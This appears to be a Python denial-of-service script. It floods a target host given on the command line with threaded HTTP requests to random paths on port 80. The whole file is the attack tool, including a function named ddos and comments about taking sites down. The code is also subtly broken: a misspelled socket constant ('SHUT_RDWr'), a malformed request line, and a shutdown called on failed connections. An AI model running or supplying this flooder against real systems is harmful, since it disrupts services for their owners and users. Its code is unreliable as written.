import socket
import threading
import random
import string
import sys
import time

hostName = ""
ipAddr = ""
portNum = 0
packets = 0

#parsing inputs from command line
#host name must be entered as url with nothing proceding the domain name
#ex: google.com, reddit.com
if len(sys.argv)==2:
    hostName = str(sys.argv[1])
    portNum = 80#default port for HTTP
    packets = 1000000000#default number of requests sent to ip address
else:
    sys.exit(1)#no valid input

#convert the host name to an IPv4 address
#if the host name is already an IPv4 address nothing is changed
ipAddr = socket.gethostbyname(hostName)
byteHostName = hostName.encode('utf-8','ignore')#convert string > bytes

#generates fake url path
def fake_url():
    message = str(string.ascii_letters + string.digits + string.punctuation)
    url = "".join(random.sample(message,5))
    return url


def ddos():
    url = fake_url()
    byte_url = url.encode('utf-8','ignore')#convert string>bytes

    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #https://docs.python.org/3/library/socket.html 

    try:
        connection.connect((ipAddr,portNum))#establish connection using IPv4 address and port number, port my be default port 80
        connection.send(b'Get /%b HTTP/1.1\nHost: %b\n\n' % (byte_url,byteHostName))#socket.send can only accept bytes
    except socket.error:#happens if a site goes down or ip is banned
        print ("\n Unable to establish connection, site may be down.")
      
    finally:
        connection.shutdown(socket.SHUT_RDWr)
        connection.close()

threads = []
for i in range(packets):
    thread1 = threading.Thread(target=ddos)
    thread1.start()
    threads.append(thread1)
    time.sleep(0.01)

for current_thread in threads:
    current_thread.join()